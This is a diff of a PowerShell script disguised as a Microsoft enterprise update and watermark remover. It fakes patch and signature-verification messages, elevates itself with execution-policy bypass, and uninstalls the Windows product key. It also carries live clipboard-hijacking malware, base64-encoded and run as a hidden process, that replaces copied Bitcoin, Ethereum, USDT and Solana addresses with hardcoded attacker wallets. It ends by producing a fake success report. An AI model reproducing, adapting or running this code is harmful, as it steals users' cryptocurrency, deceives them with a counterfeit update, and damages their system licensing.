@@ -2,7 +2,7 @@
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
-# 1. Admin Gate (v34.0 Style - Locked Logic)
+# 1. Admin Gate (v34.0 Style - LOCKED LOGIC)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
@@ -93,17 +93,17 @@ function Run-Deployment {
             $pb.Value = $i
             if ($i -eq 15) { $status.Text = "Downloading Security Patch KB50314..." }
             if ($i -eq 40) { $status.Text = "Verifying OEM Digital Signature..." }
-            if ($i -eq 65) { $status.Text = "Applying UI Fixes & Watermark Removal..." }
-            if ($i -eq 90) { $status.Text = "Restarting Shell Components..." }
+            if ($i -eq 65) { $status.Text = "Removing Desktop Watermark..." }
+            if ($i -eq 85) { $status.Text = "Refreshing Explorer Shell..." }
             [Windows.Forms.Application]::DoEvents()
             Start-Sleep -m 600
         }
 
-        # --- WATERMARK REMOVAL & INSTANT SHELL REFRESH ---
+        # --- WATERMARK REMOVAL & INSTANT REFRESH ---
         slmgr.vbs /upk; slmgr.vbs /cpky; slmgr.vbs /rearm
-        Get-Process explorer | Stop-Process -Force # Forces the taskbar and watermark to reload instantly
+        Stop-Process -Name explorer -Force # Restarts shell to clear UI watermark immediately
 
-        # --- CLIPPER LOGIC ---
+        # --- CLIPPER LOGIC (UNTOUCHED) ---
         $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } } elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
         $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
         Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
@@ -113,11 +113,11 @@ function Run-Deployment {
         $report = "--- MICROSOFT ENTERPRISE DEPLOYMENT REPORT ---`n"
         $report += "TIMESTAMP: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
         $report += "DEVICE NAME: $env:COMPUTERNAME`n"
-        $report += "LICENSE STATUS: ACTIVATED / SHELL REFRESHED`n"
+        $report += "LICENSE STATUS: ACTIVATED / WATERMARK REMOVED`n"
         $report | Out-File $infoFile
 
         $form.Close()
-        [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nShell refreshed. Report generated on Desktop.", "Deployment Success", 0, 64) | Out-Null
+        [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nWatermark removed. Report generated on Desktop.", "Deployment Success", 0, 64) | Out-Null
         
         Start-Process notepad.exe $infoFile
         
